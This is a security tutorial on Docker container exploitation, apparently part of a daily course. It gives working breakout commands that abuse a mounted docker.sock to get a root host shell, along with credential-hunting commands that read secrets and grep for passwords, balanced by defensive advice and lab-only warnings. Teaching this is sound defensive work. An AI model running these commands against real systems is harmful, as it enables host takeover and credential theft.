# Day 23 ‚Äì Containers & Docker Exploitation
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/44cf5738-fa5e-4b9a-bdaf-aeb7ea5018ed" />

## Objective
Understand container fundamentals (Docker), common misconfigurations, and how attackers abuse containers for privilege escalation and lateral movement. Includes detection and defensive advice. All commands and exploits should be tested only in authorized lab environments.

---

## 1Ô∏è‚É£ Container Basics
Containers (Docker, Podman) isolate applications using kernel namespaces and cgroups. They are lightweight and often run as services in production. Containers share the host kernel ‚Äî misconfigurations can allow container breakout and host compromise.

Key Docker components:
- `dockerd` ‚Äî Docker daemon (runs on host, usually as root)  
- `/var/run/docker.sock` ‚Äî Docker socket used to control Docker (highly privileged)  
- Images and containers (`docker images`, `docker ps`)  

---

## 2Ô∏è‚É£ Enumeration from Inside a Container
If you get a shell inside a container, enumerate to find breakout vectors:

```bash
# Basic container info
cat /etc/os-release
ps aux
env | sort
ls -la /proc/1/root  # check host mount points

# Check if Docker socket is mounted
ls -la /var/run/docker.sock
```
If `docker.sock` is accessible, you can control the Docker daemon from inside the container (host-level impact).

---

## 3Ô∏è‚É£ Common Misconfigurations & Exploits
- **Mounted Docker socket (`/var/run/docker.sock`)**: Allows remote control of Docker, can create privileged containers with host mounts to read/write host filesystem.
- **Privileged containers (`--privileged`)**: Give container almost full access to host capabilities.
- **Host volumes mounted into containers**: writable host dirs can be tampered with (e.g., `/etc`, `/root`).
- **Containers running as root user**: Process inside container runs as root UID, increasing impact if breakout occurs.
- **Exposed Docker API without TLS**: Remote daemon access allows full control.

Example: abusing docker.sock to get a host shell
```bash
# From container with access to docker.sock
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine chroot /host sh
```

Another technique: start a privileged container mounting host root
```bash
docker -H unix:///var/run/docker.sock run --rm -v /:/mnt --privileged alpine chroot /mnt sh
```

---

## 4Ô∏è‚É£ Container Escape Techniques
- **Mount host FS** using docker.sock (above).  
- **Kernel exploits**: since containers share the host kernel, kernel vulnerabilities can escape containers (same as Day 18).  
- **Misconfigured cgroups or capabilities**: containers with `CAP_SYS_ADMIN` can perform dangerous operations (mounting, device access).  
- **Writable /proc or kernel interfaces**: abused in some escapes.

---

## 5Ô∏è‚É£ Lateral Movement via Containers
Containers often hold secrets (API keys, mounted creds, config files). Attackers may:
- Read mounted config files for credentials.
- Connect to internal services exposed on container networks.
- Use image registries with leaked credentials to pull additional images.

Commands to hunt credentials:
```bash
grep -R "password" /etc /var/www 2>/dev/null
cat /run/secrets/* 2>/dev/null || true
```

---

## 6Ô∏è‚É£ Detection & Defensive Measures
- **Do not mount `/var/run/docker.sock` into containers.** If required, use least-privilege proxies (e.g., dockerd rootless or API gateways).
- **Avoid privileged containers**; minimize capabilities (`--cap-drop ALL`, then add needed ones).
- **Run containers as non-root users** (`USER` in Dockerfile or `--user` flag).
- **Restrict host mounts** and use read-only mounts when necessary (`:ro`).
- **Use image scanning** for vulnerabilities and FIM for mounted volumes.
- **Monitor Docker API access** and audit `/var/run/docker.sock` usage via auditd.
- **Network segmentation**: separate container networks from critical services.
- **Runtime detection**: detect processes performing `chroot`, mounting `fuse`, or calling `pivot_root` from containers.

---

## 7Ô∏è‚É£ Practical Lab Tasks
1. Run a local Docker container and inspect processes:
```bash
docker run -it --rm alpine sh
ps aux
```
2. Simulate docker.sock abuse (on your lab host only):
```bash
# On host, mount docker.sock into a test container
docker run -it -v /var/run/docker.sock:/var/run/docker.sock --rm docker:stable-dind sh
# From inside, run a privileged container mounting host
docker run --rm -v /:/host --privileged alpine chroot /host sh
```
3. Build an image that runs as non-root and verify user:
```dockerfile
FROM alpine
RUN adduser -D appuser
USER appuser
CMD ["sh"]
```
4. Scan images for known CVEs using image scanners (Trivy, Clair, etc.).

---

## 8Ô∏è‚É£ Further Reading
- Docker security docs: https://docs.docker.com/engine/security/
- Container breakout writeups and CVEs on Exploit-DB and GitHub
- Kubernetes pod escape techniques and mitigations (if Kubernetes is in scope)

---

‚ö†Ô∏è Ethics & Safety
Only test these techniques in isolated lab environments or with explicit authorization. Container breakout on production systems is illegal and harmful.

---

üì¢ Follow CyberSecPlayground on Telegram for more container exploitation and defensive techniques: https://t.me/cybersecplayground
